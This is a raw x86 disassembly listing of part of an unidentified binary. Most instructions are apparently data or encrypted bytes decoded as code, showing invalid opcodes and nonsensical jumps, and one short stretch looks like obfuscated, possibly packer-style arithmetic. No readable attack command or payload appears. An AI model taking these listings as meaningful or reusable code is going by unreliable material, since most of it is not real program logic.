  418b67:	loop   0x418b63
  418b69:	(bad)  
  418b6a:	jmp    0x8b4f:0x267950b4
  418b71:	(bad)  
  418b72:	repz int3 
  418b74:	sbb    ch,ch
  418b76:	sub    al,0x1f
  418b78:	ret    0xc9d7
  418b7b:	jecxz  0x418b34
  418b7d:	out    dx,eax
  418b7e:	jl     0x418bc0
  418b80:	nop
  418b81:	push   es
  418b82:	cld    
  418b83:	(bad)  
  418b84:	push   esi
  418b85:	hlt    
  418b86:	and    dl,0x3
  418b89:	aas    
  418b8a:	add    eax,0x47614151
  418b8f:	cli    
  418b90:	ins    DWORD PTR es:[edi],dx
  418b91:	xchg   ebx,eax
  418b92:	sar    DWORD PTR [ecx+0x4729516d],0x88
  418b99:	(bad)  [eax-0x1ce55d7a]
  418b9f:	pop    ebp
  418ba0:	cld    
  418ba1:	push   ebx
  418ba2:	mov    WORD PTR [edi],ss
  418ba4:	and    ecx,esp
  418ba6:	jl     0x418b6a
  418ba8:	stc    
  418ba9:	fistp  DWORD PTR [ebx-0x72ece5f3]
  418baf:	adc    BYTE PTR [edi+0x66],dl
  418bb2:	or     BYTE PTR [ebp+0x62],bl
  418bb5:	jnp    0x418b4b
  418bb7:	mov    DWORD PTR [edx-0x6a],edi
  418bba:	add    al,0xc3
  418bbc:	jge    0x418b5e
  418bbe:	xchg   ebp,eax
  418bbf:	test   al,0x7b
  418bc1:	sbb    al,0x93
  418bc3:	(bad)  
  418bc4:	call   0xb6ac8782
  418bc9:	fdivr  QWORD PTR [ecx-0x601cf2af]
  418bcf:	and    BYTE PTR [edi+0x3a4052e7],bh
  418bd5:	jle    0x418ba2
  418bd7:	add    DWORD PTR [ebp+esi*8-0x66235508],ebx
  418bde:	add    BYTE PTR [eax+edx*2+0x24c60e21],ch
  418be5:	hlt    
  418be6:	or     al,0x17
  418be8:	dec    ecx
  418be9:	jno    0x418b9b
  418beb:	pop    esi
  418bec:	arpl   WORD PTR ds:0x665e79ba,dx
  418bf2:	fisttp DWORD PTR [edi-0x1fe526c3]
  418bf8:	mov    ds:0x8059a929,al
  418bfd:	cmp    DWORD PTR [esp+edx*8+0x470c0804],ebx
  418c04:	fst    QWORD PTR [edi]
  418c06:	arpl   WORD PTR [eax],di
  418c08:	pop    esp
  418c09:	inc    edx
  418c0a:	retf   0x5059
  418c0d:	jo     0x418c72
  418c0f:	and    ebx,DWORD PTR [ebx]
  418c11:	cmp    eax,0x16a023a1
  418c16:	and    al,0x45
  418c18:	xchg   ebp,eax
  418c19:	in     al,dx
  418c1a:	inc    edi
  418c1b:	popa   
  418c1c:	dec    DWORD PTR [edi+esi*1]
  418c1f:	mov    dl,BYTE PTR [edx-0x7c]
  418c22:	push   esp
  418c23:	pop    edx
  418c24:	dec    esp
  418c25:	cmp    DWORD PTR [eax+edi*2],ebx
  418c28:	inc    eax
  418c29:	imul   esp,DWORD PTR [ecx+0x76de4608],0x26
  418c30:	dec    esi
  418c31:	ds adc eax,0x9e2ed083
  418c37:	int3   
  418c38:	pusha  
  418c39:	pusha  
  418c3a:	iret   
  418c3b:	ja     0x418c77
  418c3d:	call   0xd6b4c2df
  418c42:	jmp    0x418be6
  418c44:	mov    eax,0x66d844c5
  418c49:	cmp    BYTE PTR [esi+0x42],dl
  418c4c:	mov    esp,0xb40bc1de
  418c51:	fwait
  418c52:	mov    edx,0xa57885a5
  418c57:	call   0x81cd4d9
  418c5c:	mov    bh,0xa8
  418c5e:	dec    esi
  418c5f:	add    eax,0x43b95fa9
  418c64:	jne    0x418c9d
  418c66:	imul   eax,ebp,0xd
  418c69:	mov    DWORD PTR [edi+0x621a9167],eax
  418c6f:	out    0x82,eax
  418c71:	shl    DWORD PTR [esi],0x19
  418c74:	mov    dh,0xde
  418c76:	xor    bl,ch
  418c78:	js     0x418cbe
  418c7a:	mov    ch,0xd4
  418c7c:	sub    bh,ch
  418c7e:	test   DWORD PTR [edx],esi
  418c80:	ss mov edx,0x42478c94
  418c86:	iret   
  418c87:	mov    esi,0xe581e5f6
  418c8c:	pop    ss
  418c8d:	in     al,0x2d
  418c8f:	mov    bl,0xcd
  418c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c92:	cmp    eax,0xd68742de
  418c97:	in     eax,0x9f
  418c99:	inc    ebp
  418c9a:	sbb    DWORD PTR [edi+0x6],edi
  418c9d:	outs   dx,DWORD PTR ds:[esi]
  418c9e:	mov    ah,0xe
  418ca0:	loope  0x418cad
  418ca2:	dec    ebx
  418ca3:	cdq    
  418ca4:	mov    eax,ds:0x32460495
  418ca9:	inc    ebp
  418caa:	inc    edi
  418cab:	popf   
  418cac:	or     dl,BYTE PTR [edx-0x14]
  418caf:	add    al,BYTE PTR [ecx-0x10c10586]
  418cb5:	dec    eax
  418cb6:	cwde   
  418cb7:	cwde   
  418cb8:	inc    DWORD PTR [eax]
  418cba:	js     0x418cc3
  418cbc:	push   0xe3731308
  418cc1:	mov    bh,0x3e
  418cc3:	fsub   QWORD PTR [edi-0x1a]
  418cc6:	jmp    0x418ce6
  418cc8:	xchg   ebp,esi
  418cca:	mov    ch,0x75
  418ccc:	retf   0xc10e
  418ccf:	pop    ss
  418cd0:	mov    DWORD PTR [ebx],ebp
  418cd2:	sbb    DWORD PTR [eax],0xffffffa8
  418cd5:	pop    edi
  418cd6:	xchg   edi,eax
  418cd7:	jmp    0xdb4a8e8e
  418cdc:	sahf   
  418cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cde:	nop
  418cdf:	add    al,0x69
  418ce1:	lods   al,BYTE PTR ds:[esi]
  418ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ce3:	in     al,dx
  418ce4:	or     DWORD PTR [edi],ebp
  418ce6:	jp     0x418cd9
  418ce8:	pop    ds
  418ce9:	adc    dl,cl
  418ceb:	mov    ecx,0xc39ce5f0
  418cf0:	dec    ecx
  418cf1:	call   0x6af127ae
  418cf6:	in     al,dx
  418cf7:	and    bl,bh
  418cf9:	fldcw  WORD PTR [esi-0x6d]
  418cfc:	stos   DWORD PTR es:[edi],eax
  418cfd:	aas    
  418cfe:	mov    esp,DWORD PTR [ecx]
  418d00:	pushf  
  418d01:	test   DWORD PTR [ebx],edx
  418d03:	(bad)  
  418d04:	or     eax,0xd3d341c2
  418d09:	mov    dh,dl
  418d0b:	pop    eax
  418d0c:	sbb    al,0xa3
  418d0e:	or     eax,0x19447f2f
  418d13:	inc    esi
  418d14:	ffreep st(7)
  418d16:	sub    BYTE PTR [edi],cl
  418d18:	cli    
  418d19:	jb     0x418cd6
  418d1b:	fs pusha 
  418d1d:	xchg   ebp,eax
  418d1e:	and    al,0xf5
  418d20:	adc    al,0xff
  418d22:	inc    edx
  418d23:	add    edx,ebp
  418d25:	test   DWORD PTR [esi+ebp*8+0x28663281],ebx
  418d2c:	jl     0x418d27
  418d2e:	lock out dx,al
  418d30:	jb     0x418ce4
  418d32:	pop    ebx
  418d33:	jmp    0x418cba
  418d35:	and    eax,0xb21559c3
  418d3a:	sbb    eax,0xcc02d9aa
  418d3f:	mov    dh,0x6e
  418d41:	int3   
  418d42:	in     al,dx
  418d43:	aad    0x19
  418d45:	or     eax,0xd0daf8a9
  418d4a:	popf   
  418d4b:	xor    al,0x3c
  418d4d:	pop    ebx
  418d4e:	push   eax
  418d4f:	pop    ebp
  418d50:	dec    edx
  418d51:	je     0x418d25
  418d53:	sbb    BYTE PTR [esi],ch
  418d55:	pop    ss
  418d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d57:	mov    ds:0xf91990e4,eax
  418d5c:	pop    edx
  418d5d:	jb     0x418d2b
  418d5f:	pop    eax
  418d60:	cld    
  418d61:	mov    esp,0x61a8c93
  418d66:	scas   eax,DWORD PTR es:[edi]
  418d67:	addr16 push edx
  418d69:	inc    ebx
  418d6a:	push   edi
  418d6b:	mov    eax,ds:0xe2129d5b
  418d70:	fcmovnbe st,st(5)
  418d72:	mov    edx,0x2f61195
  418d77:	cdq    
  418d78:	pop    ecx
  418d79:	aam    0xdf
  418d7b:	adc    BYTE PTR [eax-0x23],0x95
  418d7f:	xlat   BYTE PTR ds:[ebx]
  418d80:	gs enter 0x8acc,0xdc
  418d85:	jae    0x418dde
  418d87:	lock iret 
  418d89:	push   ebx
  418d8a:	sahf   
  418d8b:	or     bl,BYTE PTR [edx-0x59]
  418d8e:	jbe    0x418df3
  418d90:	gs cmp al,0x6c
  418d93:	int    0x5a
  418d95:	adc    ebp,DWORD PTR [ebx+0x11]
  418d98:	mov    BYTE PTR [ecx-0x5bd02a8],dh
  418d9e:	fwait
  418d9f:	rep ins BYTE PTR es:[di],dx
  418da2:	cmc    
  418da3:	div    BYTE PTR [ebp-0x317fefcf]
  418da9:	repz push ss
  418dab:	xchg   DWORD PTR [eax-0x347283aa],esi
  418db1:	mov    eax,ds:0xcf0f46e6
  418db6:	pushf  
  418db7:	or     DWORD PTR [edi+0x76d7db63],0x3d
  418dbe:	les    esi,FWORD PTR [edx+0x8]
  418dc1:	in     al,0x26
  418dc3:	xchg   edx,eax
  418dc4:	ret    0x799c
  418dc7:	push   0xffffffdc
  418dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dca:	pop    ebp
  418dcb:	sub    ch,dh
  418dcd:	test   DWORD PTR [edi-0x5850f961],ebx
  418dd3:	out    0x33,eax
  418dd5:	int    0xa3
  418dd7:	xlat   BYTE PTR ds:[ebx]
  418dd8:	fbld   TBYTE PTR [esi-0x80]
  418ddb:	ins    BYTE PTR es:[edi],dx
  418ddc:	xchg   edi,eax
  418ddd:	mov    edi,0xea2cc0e3
  418de2:	and    edi,DWORD PTR [edi-0x2746de7b]
  418de8:	inc    esi
  418de9:	jne    0x418e2c
  418deb:	mov    edi,0x4d8ea261
  418df0:	ret    
  418df1:	jbe    0x418d97
  418df3:	fidivr DWORD PTR [ebp+eiz*4+0x7f690457]
  418dfa:	loope  0x418e20
  418dfc:	ins    BYTE PTR es:[edi],dx
  418dfd:	addr16 pop edi
  418dff:	cmc    
  418e00:	add    al,0x5b
  418e02:	repz imul edx,DWORD PTR [edx-0x3223e8cf],0x1b81417f
  418e0d:	nop
  418e0e:	mov    ebp,0x9b76238
  418e13:	sti    
  418e14:	mov    dh,0x55
  418e16:	cmp    eax,DWORD PTR [edi-0x5d]
  418e19:	or     al,0x59
  418e1b:	cmp    eax,DWORD PTR [eax+0x1b]
  418e1e:	dec    ebx
  418e1f:	jno    0x418e4f
  418e21:	cmp    dl,al
  418e23:	test   DWORD PTR [ebx-0xb],esi
  418e26:	iret   
  418e27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e28:	push   edi
  418e29:	or     DWORD PTR [eax+0x1102a163],esp
  418e2f:	stos   DWORD PTR es:[edi],eax
  418e30:	add    eax,0x309c7b8
  418e35:	dec    edx
  418e36:	pop    ebx
  418e37:	cld    
  418e38:	xor    BYTE PTR [ecx+0x639827a3],ah
  418e3e:	pop    edx
  418e3f:	outs   dx,BYTE PTR ds:[esi]
  418e40:	jno    0x418e13
  418e42:	mov    ah,0x5c
  418e44:	or     DWORD PTR [edi-0x2e],0xc18006c6
  418e4b:	jo     0x418e0f
  418e4d:	addr16 fwait
  418e4f:	popa   
  418e50:	jns    0x418e97
  418e52:	pop    eax
  418e53:	rcl    DWORD PTR [esi],1
  418e55:	dec    ecx
  418e56:	fstp   TBYTE PTR [edi-0x243c23dc]
  418e5c:	inc    ecx
  418e5d:	or     dh,BYTE PTR [ebx]
  418e5f:	jo     0x418dfb
  418e61:	mov    eax,ds:0xf9e2b120
  418e66:	or     dh,BYTE PTR [ebp-0x35]
  418e69:	dec    bp
  418e6b:	scas   al,BYTE PTR es:[edi]
  418e6c:	push   edx
  418e6d:	xchg   esp,eax
  418e6e:	xor    al,bl
  418e70:	sbb    al,0xd5
  418e72:	ins    DWORD PTR es:[edi],dx
  418e73:	mov    al,BYTE PTR [ecx-0x7]
  418e76:	call   0xa61f11c5
  418e7b:	out    0xac,al
  418e7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e7e:	repnz adc BYTE PTR [edi+0x33],bl
  418e82:	or     DWORD PTR [ebx],esi
  418e84:	jg     0x418e52
  418e86:	cmp    BYTE PTR [ecx+ecx*2-0x2534f2cb],bh
  418e8d:	fbstp  TBYTE PTR [edx+ebx*4+0x1c]
  418e91:	es hlt 
  418e93:	jg     0x418e72
  418e95:	loop   0x418e37
  418e97:	js     0x418e29
  418e99:	inc    ebx
  418e9a:	push   edi
  418e9b:	push   es
  418e9c:	ret    
  418e9d:	dec    edi
  418e9e:	dec    esp
  418e9f:	bound  ebx,QWORD PTR [ecx]
  418ea1:	and    bh,BYTE PTR [ecx]
  418ea3:	(bad)  
  418ea4:	push   ecx
  418ea5:	xchg   BYTE PTR ds:0x36345a5e,ch
  418eab:	or     DWORD PTR [ecx],ebx
  418ead:	shl    ebx,0x7a
  418eb0:	aaa    
  418eb1:	fimul  DWORD PTR [edi]
  418eb3:	push   ss
  418eb4:	jle    0x418e73
  418eb6:	add    eax,0xd4d01461
  418ebb:	adc    BYTE PTR [ecx],ch
  418ebd:	in     eax,dx
  418ebe:	inc    edi
  418ebf:	xchg   BYTE PTR [esi],dl
  418ec1:	inc    edx
  418ec2:	sub    ecx,DWORD PTR [ecx+0x3de9add6]
  418ec8:	pushf  
  418ec9:	xor    BYTE PTR [ebx-0x3787d9c6],dl
  418ecf:	add    esp,eax
  418ed1:	mov    ds:0xf119336a,eax
  418ed6:	add    dh,ch
  418ed8:	cdq    
  418ed9:	sbb    ebx,DWORD PTR [edi-0x512dc654]
  418edf:	paddd  mm3,QWORD PTR [eax]
  418ee2:	fwait
  418ee3:	jns    0x418f59
  418ee5:	call   0xfd70f3ca
  418eea:	in     eax,dx
  418eeb:	jl     0x418e88
  418eed:	xchg   ecx,eax
  418eee:	adc    ebx,0x20
  418ef1:	ret    0x6312
  418ef4:	dec    edi
  418ef5:	adc    eax,0xa2598df3
  418efa:	imul   ebx,DWORD PTR [ecx-0x57aaad6d],0xc3136b84
  418f04:	fdivr  DWORD PTR [ebx+0x2]
  418f07:	sbb    BYTE PTR [ebx+ebx*2+0x25055bb0],ah
  418f0e:	loopne 0x418f03
  418f10:	ins    DWORD PTR es:[edi],dx
  418f11:	adc    BYTE PTR [ebp+0x72f45ad8],bl
  418f17:	(bad)  
  418f18:	and    edi,DWORD PTR [ebx+ecx*4-0x11de872d]
  418f1f:	xlat   BYTE PTR ds:[ebx]
  418f20:	loopne 0x418f01
  418f22:	sar    BYTE PTR ds:0xc3331d7b,1
  418f28:	pop    es
  418f29:	add    al,0x65
  418f2b:	and    dh,cl
  418f2d:	stc    
  418f2e:	mov    bl,0x6a
  418f30:	out    0xb4,eax
  418f32:	ror    BYTE PTR [ecx-0x76197d56],1
  418f38:	sub    eax,0xc3efcd30
  418f3d:	sbb    dl,BYTE PTR [eax]
  418f3f:	and    al,0x11
  418f41:	ja     0x418f17
  418f43:	jge    0x418fba
  418f45:	iret   
  418f46:	ret    0x53b1
  418f49:	push   0x7ebe43b2
  418f4e:	push   cs
  418f4f:	and    dh,al
  418f51:	cwde   
  418f52:	mov    dh,0x4d
  418f54:	cmp    cl,cl
  418f56:	mov    al,ds:0x6d055d16
  418f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f5c:	mov    dh,0xd4
  418f5e:	neg    DWORD PTR [esi+0x42a8864a]
  418f64:	dec    ecx
  418f65:	adc    DWORD PTR [esi-0xbbd5ded],0xc4725c24
  418f6f:	jbe    0x418fb5
  418f71:	dec    edi
  418f72:	or     eax,0xc5214817
  418f77:	mov    BYTE PTR [edx-0x41],0xf1
  418f7b:	adc    eax,DWORD PTR [esi-0x2e]
  418f7e:	aam    0xdc
  418f80:	fmul   QWORD PTR [ebx]
  418f82:	inc    esp
  418f83:	call   0x5ea1d997
  418f88:	mov    ah,0x7f
  418f8a:	pop    ebx
  418f8b:	or     esi,edi
  418f8d:	ds xchg ecx,eax
  418f8f:	stos   BYTE PTR es:[edi],al
  418f90:	not    DWORD PTR [ebx-0x703b3bcb]
  418f96:	femms  
  418f98:	nop
  418f99:	popf   
  418f9a:	or     BYTE PTR [ebx+0x19fb9738],0x7
  418fa1:	ss jp  0x418f3b
  418fa4:	mov    dl,0xe1
  418fa6:	inc    eax
  418fa7:	call   0xa5153239
  418fac:	cs push es
  418fae:	std    
  418faf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fb0:	faddp  st(1),st
  418fb2:	and    eax,DWORD PTR [edi]
  418fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fb5:	(bad)  
  418fb6:	(bad)  
  418fb7:	xor    DWORD PTR [eax+ecx*1],esp
  418fba:	push   es
  418fbb:	into   
  418fbc:	pop    ebx
  418fbd:	ins    DWORD PTR es:[edi],dx
  418fbe:	cmp    ah,ch
  418fc0:	cli    
  418fc1:	jmp    0xc98e63c8
  418fc6:	pop    ecx
  418fc7:	call   0x982e:0xcf472bcb
  418fce:	ret    0x6124
  418fd1:	scas   al,BYTE PTR es:[edi]
  418fd2:	jmp    0x418fed
  418fd4:	sti    
  418fd5:	es ja  0x418f99
  418fd8:	stc    
  418fd9:	in     al,dx
  418fda:	int3   
  418fdb:	imul   edx,DWORD PTR [edx],0xffffffee
  418fde:	loope  0x418ffd
  418fe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fe1:	stos   BYTE PTR es:[edi],al
  418fe2:	icebp  
  418fe3:	xor    al,0xc5
  418fe5:	push   ebp
  418fe6:	imul   bl
  418fe8:	and    BYTE PTR [ecx-0x3144268b],dl
  418fee:	mov    al,0xf
  418ff0:	fisttp DWORD PTR [ebx]
  418ff2:	mov    esp,0xe1123f31
  418ff7:	pop    ebx
  418ff8:	sub    DWORD PTR [ebx],0xef733b70
  418ffe:	lods   al,BYTE PTR ds:[esi]
  418fff:	fs jmp 0x94289a91
  419005:	test   al,0x52
  419007:	add    BYTE PTR [ebx-0x471c8958],ch
  41900d:	jmp    0x4c17:0x4411a260
  419014:	in     eax,0x49
  419016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419017:	outs   dx,BYTE PTR ds:[esi]
  419018:	fistp  QWORD PTR [ecx+eiz*1-0x63]
  41901c:	fsubr  DWORD PTR [esi+ebx*4+0x47c5ab88]
  419023:	les    edi,FWORD PTR [ebx+0x1f]
  419026:	repz pop DWORD PTR [ebx+ebp*4]
  41902a:	and    DWORD PTR [ebx+edi*4-0x7a],esi
  41902e:	jno    0x419059
  419030:	(bad)  
  419031:	cmp    ecx,DWORD PTR [ebp+edx*1-0x2cff3fdb]
  419038:	daa    
  419039:	sub    cl,BYTE PTR [edi+0x3c22c5ac]
  41903f:	out    0xbb,al
  419041:	div    edx
  419043:	adc    ebx,DWORD PTR [ecx+0x2cf8c824]
  419049:	mov    edi,0xf4ef12b8
  41904e:	cmp    eax,0xc186206a
  419053:	sub    al,0x9b
  419055:	cmp    DWORD PTR [edx-0x78],eax
  419058:	add    DWORD PTR [ebp+0x18946aed],edx
  41905e:	push   esp
  41905f:	jecxz  0x4190b9
  419061:	das    
  419062:	js     0x4190d6
  419064:	ja     0x41902b
  419066:	xor    ebx,0x40159fc0
  41906c:	arpl   WORD PTR [bx+0x271f],sp
  419071:	and    eax,0x7deb2736
  419076:	stos   DWORD PTR es:[edi],eax
  419077:	mov    eax,0x3376f2ed
  41907c:	pop    ebp
  41907d:	es iret 
  41907f:	in     al,0x1a
  419081:	stos   DWORD PTR es:[edi],eax
  419082:	sbb    cl,dl
  419084:	mov    di,0xf80d
  419088:	xor    esi,DWORD PTR [eax+ecx*1]
  41908b:	ins    DWORD PTR es:[edi],dx
  41908c:	inc    eax
  41908d:	frstor [esi-0xd]
  419090:	jo     0x419071
  419092:	mov    esi,0x646e9709
  419097:	mov    ecx,0x8691eb64
  41909c:	je     0x419071
  41909e:	iret   
  41909f:	loop   0x41908e
  4190a1:	ins    BYTE PTR es:[edi],dx
  4190a2:	dec    esp
  4190a3:	inc    esp
  4190a4:	scas   al,BYTE PTR es:[edi]
  4190a5:	mov    ds:0xc953ca05,al
  4190aa:	popa   
  4190ab:	dec    esp
  4190ac:	ds sahf 
  4190ae:	inc    edx
  4190af:	fst    DWORD PTR [edx-0x67]
  4190b2:	(bad)  
  4190b3:	popf   
  4190b4:	mov    edi,0x45a4b3b2
  4190b9:	push   ecx
  4190ba:	out    dx,al
  4190bb:	or     DWORD PTR [esi-0x60],edi
  4190be:	not    BYTE PTR [ebx+0x4e33e662]
  4190c4:	push   ebp
  4190c5:	stos   DWORD PTR es:[edi],eax
  4190c6:	push   esi
  4190c7:	aaa    
  4190c8:	push   es
  4190c9:	les    eax,FWORD PTR [ebx]
  4190cb:	dec    ax
  4190cd:	popa   
  4190ce:	std    
  4190cf:	sti    
  4190d0:	bound  eax,QWORD PTR [eax+0x5d8b197c]
  4190d6:	sbb    al,0x7
  4190d8:	mov    ch,0xea
  4190da:	xor    al,0x65
  4190dc:	or     bh,BYTE PTR [esi+ecx*8+0x9]
  4190e0:	rcl    DWORD PTR ds:0x33fcaa,1
  4190e6:	in     al,dx
  4190e7:	jmp    0x41912f
  4190e9:	cmp    BYTE PTR [ebx+0x6b20240f],dh
  4190ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190f0:	(bad)  
  4190f3:	call   0xbb86:0xa8b490f3
  4190fa:	not    BYTE PTR [edx]
  4190fc:	fild   DWORD PTR [edi-0x65d18c01]
  419102:	and    al,bl
  419104:	fbld   TBYTE PTR [edi+0x7d5d4d59]
  41910a:	js     0x419136
  41910c:	ror    BYTE PTR [esi],cl
  41910e:	xchg   ebp,eax
  41910f:	ror    BYTE PTR [ecx-0x2562e644],0x4
  419116:	mov    esp,0x818efc6c
  41911b:	dec    eax
  41911c:	dec    ecx
  41911d:	add    esi,ebp
  41911f:	arpl   WORD PTR [edi+0x1682ada3],bp
  419125:	xchg   ebp,eax
  419126:	iret   
  419127:	inc    esp
  419128:	jg     0x4190f8
  41912a:	add    al,0x19
  41912c:	scas   eax,DWORD PTR es:[edi]
  41912d:	retf   
  41912e:	xlat   BYTE PTR ds:[ebx]
  41912f:	(bad)  
  419130:	push   ecx
  419131:	push   eax
  419132:	pushf  
  419133:	shl    DWORD PTR [eax-0x80],0xa6
  419137:	test   DWORD PTR [eax-0x7b],eax
  41913a:	pop    ebx
  41913b:	add    DWORD PTR [edi],esi
  41913d:	clc    
  41913e:	mov    eax,ds:0x894eb561
  419143:	push   ebp
  419144:	mov    al,0x8b
  419146:	push   ebp
  419147:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  41914d:	and    edx,ebx
  41914f:	mov    DWORD PTR [ebp-0x4c],edx
  419152:	mov    edx,DWORD PTR [ebp+0x8]
  419155:	mov    ebx,DWORD PTR [ebp-0x48]
  419158:	lea    edx,[ebx+edx*1+0x241fcdf]
  41915f:	mov    DWORD PTR [ebp-0x48],edx
  419162:	mov    edx,DWORD PTR [ebp+0x8]
  419165:	mov    ebx,0xfa5e1524
  41916a:	sub    ebx,edx
  41916c:	add    ebx,DWORD PTR [ebp-0x44]
  41916f:	mov    DWORD PTR [ebp-0x44],ebx
  419172:	mov    edx,DWORD PTR [ebp+0x8]
  419175:	xor    edx,eax
  419177:	add    edx,esi
  419179:	jne    0x416da2
  41917f:	mov    edx,DWORD PTR [ebp-0x8]
  419182:	mov    ebx,DWORD PTR [ebp-0xc]
  419185:	xor    edx,eax
  419187:	lea    edx,[edx+ebx*1+0x3272f5]
  41918e:	mov    DWORD PTR [ebp-0xc],edx
  419191:	mov    edx,DWORD PTR [ebp-0x10]
  419194:	xor    edx,eax
  419196:	add    edx,esi
  419198:	jne    0x4124bd
  41919e:	jmp    0x41b615
  4191a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4191a6:	mov    DWORD PTR [ebp+0x8],ecx
  4191a9:	jmp    0x41b582
  4191ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4191b1:	mov    edx,DWORD PTR [ebp-0x8]
  4191b4:	xor    ecx,eax
  4191b6:	xor    edx,eax
  4191b8:	sub    ecx,edx
  4191ba:	sub    ecx,esi
  4191bc:	xor    ecx,eax
  4191be:	mov    DWORD PTR [ebp+0x8],ecx
  4191c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4191c4:	mov    edx,DWORD PTR [ebp-0x58]
  4191c7:	add    ecx,0x5708e2
  4191cd:	imul   ecx,edx
  4191d0:	mov    DWORD PTR [ebp-0x58],ecx
  4191d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4191d6:	mov    edx,DWORD PTR [ebp-0x54]
  4191d9:	add    ecx,0x64f880
  4191df:	or     ecx,edx
  4191e1:	mov    DWORD PTR [ebp-0x54],ecx
  4191e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4191e7:	mov    edx,DWORD PTR [ebp-0x50]
  4191ea:	add    ecx,0x242ebf1
  4191f0:	xor    ecx,edx
  4191f2:	mov    DWORD PTR [ebp-0x50],ecx
  4191f5:	jmp    0x41b555
  4191fa:	pop    edx
  4191fb:	cmp    al,0xf8
  4191fd:	inc    esp
  4191fe:	xchg   esi,eax
  4191ff:	test   dl,cl
  419201:	and    al,BYTE PTR [edx+0x12f7278c]
  419207:	retf   
  419208:	aas    
  419209:	inc    esi
  41920a:	xor    esp,DWORD PTR [eax]
  41920c:	add    BYTE PTR [ebx-0x7c7ca1c2],0xd2
  419213:	push   ebp
  419214:	hlt    
  419215:	adc    ah,dl
  419217:	cmp    BYTE PTR [ebp+0x48],cl
  41921a:	fld    TBYTE PTR [ebx+ebx*8+0x14cd84f0]
  419221:	outs   dx,BYTE PTR ds:[esi]
  419222:	or     dh,al
  419224:	mov    eax,0xa7b46cc6
  419229:	push   0x56
  41922b:	push   eax
  41922c:	push   cs
  41922d:	pusha  
  41922e:	ror    bh,0x98
  419231:	dec    esp
  419232:	fcmovne st,st(7)
  419234:	push   ss
  419235:	cmp    eax,0x9f96d73f
  41923a:	iret   
  41923b:	xchg   esi,eax
  41923c:	mov    bl,0x73
  41923e:	xchg   ecx,eax
  41923f:	push   edx
  419240:	xchg   esp,eax
  419241:	enter  0x9e10,0x61
  419245:	pop    edi
  419246:	pop    ss
  419247:	outs   dx,DWORD PTR ds:[esi]
  419248:	jmp    0x6e77:0x55aea36
  41924f:	xor    cl,BYTE PTR [eax]
  419251:	adc    cl,al
  419253:	mov    esp,0x81aaf068
  419258:	sbb    DWORD PTR ds:0x44187578,esi
  41925e:	cli    
  41925f:	bound  edi,QWORD PTR ds:0x7ed33905
  419265:	dec    BYTE PTR [edx]
  419267:	adc    eax,0xbabbdf19
  41926c:	inc    eax
  41926d:	sub    al,0xfd
  41926f:	jmp    0x4192d3
  419271:	scas   al,BYTE PTR es:[edi]
  419272:	adc    eax,0xe848ca96
  419277:	cmp    ch,al
  419279:	fucomp st(7)
  41927b:	fild   QWORD PTR [ebx+ecx*8]
  41927e:	arpl   cx,bp
  419280:	sbb    al,0x1
  419282:	push   edx
  419283:	jo     0x41929b
  419285:	xchg   ecx,eax
  419286:	xchg   DWORD PTR [esi-0x25d05450],ecx
  41928c:	gs mov bl,0xbc
  41928f:	or     DWORD PTR [edi],0x6d
  419292:	jmp    0x41930d
  419294:	inc    ebx
  419295:	cmc    
  419296:	and    ebp,DWORD PTR fs:[esi-0x6c]
  41929a:	stos   BYTE PTR es:[edi],al
  41929b:	fwait
  41929c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41929d:	arpl   bx,di
  41929f:	mov    edi,0xc98845ce
  4192a4:	lods   eax,DWORD PTR ds:[esi]
  4192a5:	sub    DWORD PTR [esp+edi*8+0x5dcdf0ec],0x7a541cec
  4192b0:	push   ds
  4192b1:	adc    BYTE PTR [esi+0x41],dl
  4192b4:	scas   al,BYTE PTR es:[edi]
  4192b5:	mov    esp,0x93f6f013
  4192ba:	push   cs
  4192bb:	das    
  4192bc:	icebp  
  4192bd:	xlat   BYTE PTR ds:[ebx]
  4192be:	xchg   esi,eax
  4192bf:	ins    BYTE PTR es:[edi],dx
  4192c0:	sub    DWORD PTR [eax-0x25],0x6f
  4192c4:	sbb    eax,0x9e08d067
  4192c9:	jb     0x4192ba
  4192cb:	ds mov eax,0x53d84caf
  4192d1:	arpl   WORD PTR [ebp+0x31],bp
  4192d4:	sbb    esi,DWORD PTR ds:0x51527b48
  4192da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192db:	jecxz  0x419345
  4192dd:	or     al,0x7c
  4192df:	dec    ebp
  4192e0:	add    DWORD PTR [ebx-0x60],0xffffffaa
  4192e4:	push   ecx
  4192e5:	mov    al,ds:0x1f0484a4
  4192ea:	ins    BYTE PTR es:[edi],dx
  4192eb:	adc    eax,0x1a55c139
  4192f0:	shl    DWORD PTR [esi],cl
  4192f2:	jns    0x419334
  4192f4:	pop    eax
  4192f5:	lods   eax,DWORD PTR ds:[esi]
  4192f6:	mov    dl,0x52
  4192f8:	push   edi
  4192f9:	sar    ebx,1
  4192fb:	mov    DWORD PTR [edx+0x7b],ebx
  4192fe:	mov    ah,BYTE PTR [esi]
  419300:	or     eax,0x89351779
  419305:	mov    al,0x99
  419307:	and    ebp,DWORD PTR [ebx]
  419309:	rep lods eax,DWORD PTR ds:[esi]
  41930b:	add    DWORD PTR [esi],edx
  41930d:	pop    es
  41930e:	mov    cl,0x53
  419310:	cmp    BYTE PTR [eax+0x15],al
  419313:	faddp  st(4),st
  419315:	mov    ebp,0xec1a7299
  41931a:	pop    ebp
  41931b:	inc    edx
  41931c:	push   esp
